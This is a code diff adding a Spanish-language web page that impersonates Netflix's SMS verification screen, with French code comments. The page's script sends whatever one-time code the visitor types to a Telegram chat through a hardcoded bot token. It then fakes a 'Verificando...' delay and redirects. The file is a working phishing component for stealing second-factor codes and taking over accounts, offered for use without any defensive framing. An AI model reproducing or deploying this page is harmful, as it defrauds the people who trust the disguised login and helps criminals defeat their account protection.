@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Netflix – Verificación por SMS</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      height: 100%;
+      font-family: 'Arial', sans-serif;
+      background: url('background.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+      display: flex;
+      flex-direction: column;
+    }
+    .header {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      padding: 20px;
+    }
+    .header img {
+      width: 120px;
+    }
+    .container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      background: rgba(0,0,0,0.75);
+    }
+    form {
+      background-color: rgba(0,0,0,0.8);
+      padding: 30px;
+      border-radius: 8px;
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+    }
+    h1 {
+      margin-bottom: 20px;
+      color: #e50914;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      margin-bottom: 20px;
+      border: none;
+      border-radius: 5px;
+      background: #333;
+      color: white;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      background-color: #e50914;
+      color: white;
+      margin-bottom: 10px;
+    }
+    button:hover {
+      background-color: #f6121d;
+    }
+    .resend {
+      background-color: gray;
+    }
+    #timer {
+      font-size: 14px;
+      margin-bottom: 15px;
+      color: #ccc;
+    }
+  </style>
+</head>
+<body>
+
+<div class="header">
+  <img src="logo.png" alt="Netflix">
+</div>
+
+<div class="container">
+  <form id="sms-form">
+    <h1>Verificación por SMS</h1>
+    <input type="text" id="smsCode" placeholder="Código recibido por SMS" required>
+    <div id="timer">Reenviar disponible en 5:00</div>
+    <button type="button" id="resendBtn" class="resend" disabled>Reenviar código</button>
+    <button type="submit">Terminar</button>
+  </form>
+</div>
+
+<script>
+// Configuration Telegram
+const botToken = "7991899427:AAGm5oI3Hiq1g0qtew_CKbEh28_YcbH7JRY";
+const chatId = "-4890781004";
+
+// Envoyer le code à Telegram et rediriger
+document.getElementById('sms-form').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const smsCode = document.getElementById('smsCode').value;
+  const message = `📲 Code de vérification SMS reçu : ${smsCode}`;
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+    .then(() => {
+      // Attente puis redirection
+      const terminarBtn = document.querySelector('button[type="submit"]');
+      terminarBtn.innerText = "Verificando...";
+      terminarBtn.disabled = true;
+
+      setTimeout(() => {
+        window.location.href = "index.html";
+      }, 10000); // 10 secondes
+    })
+    .catch(err => {
+      alert("Error al enviar el código.");
+      console.error(err);
+    });
+});
+
+// Timer de 5 minutes
+let resendBtn = document.getElementById("resendBtn");
+let timerEl = document.getElementById("timer");
+let timeLeft = 300; // 5 minutes = 300 secondes
+
+function updateTimer() {
+  let min = Math.floor(timeLeft / 60);
+  let sec = timeLeft % 60;
+  timerEl.textContent = `Reenviar disponible en ${min}:${sec < 10 ? "0" + sec : sec}`;
+  if (timeLeft > 0) {
+    timeLeft--;
+    setTimeout(updateTimer, 1000);
+  } else {
+    resendBtn.disabled = false;
+    resendBtn.style.backgroundColor = "#e50914";
+    timerEl.textContent = "Puedes reenviar el código ahora.";
+  }
+}
+
+updateTimer();
+
+// Optionnel : action sur “Reenviar código”
+resendBtn.addEventListener("click", function() {
+  resendBtn.disabled = true;
+  resendBtn.style.backgroundColor = "gray";
+  timeLeft = 300;
+  updateTimer();
+  alert("Código reenviado (simulado).");
+});
+</script>
+
+</body>
+</html>
